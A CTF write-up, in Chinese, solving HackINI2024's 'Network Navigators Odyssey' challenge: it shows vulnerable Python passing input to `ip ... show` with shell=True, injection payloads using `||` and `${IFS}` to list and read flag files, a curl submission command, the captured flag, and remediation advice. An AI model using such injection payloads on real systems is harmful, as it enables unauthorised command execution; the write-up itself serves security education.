# HackINI2024 Network Navigators Odyssey

## 题目简述

网络面板把用户选项拼进 `ip <option> show`，并使用 `shell=True` 执行。程序采用子串白名单和不完整黑名单，虽然禁止空格、分号、连字符和多个常见读文件命令，却遗漏了 `|`，目标是组合 shell 逻辑运算符与 `${IFS}` 完成命令注入。

## 解题过程

关键代码为：

```python
if any(character in option for character in blacklist):
    return "Malicious input detected."

if not any(opt in option for opt in whitelist):
    return "only these options are available"

subprocess.run(
    f"ip {option} show",
    shell=True,
    capture_output=True,
    text=True,
)
```

白名单只要求输入包含 `address` 等任一子串，并不要求整个参数等于合法选项。黑名单遗漏 `|`，所以可用 `||` 串联命令；`${IFS}` 在 shell 中展开为空白，可以替代被禁止的字面空格。

先列出根目录并在末尾放入 `address` 满足白名单：

```text
||ls${IFS}/||address
```

输出可见随机文件名形如 `/flagfbbed20a24.txt`。再用未被禁止的 `grep` 和通配符直接读取：

```text
||grep${IFS}"shellmates"${IFS}/flag*||address
```

通过表单提交时可让 curl 负责编码：

```bash
curl 'http://TARGET/' \
  --data-urlencode \
  'option=||grep${IFS}"shellmates"${IFS}/flag*||address'
```

响应中得到：

```text
shellmates{S1l3nc3d_S3rv3r5___Ech0_Just1c3}
```

## 方法总结

把输入拼进 `shell=True` 命令后，黑名单几乎必然遗漏等价语法。子串白名单同样无法约束完整命令。应改为 `shell=False` 的参数数组，并把允许的业务选项做精确相等匹配；即便如此，也要继续审查目标程序自身是否存在危险参数，正如本题的 Rebirth 版本所示。
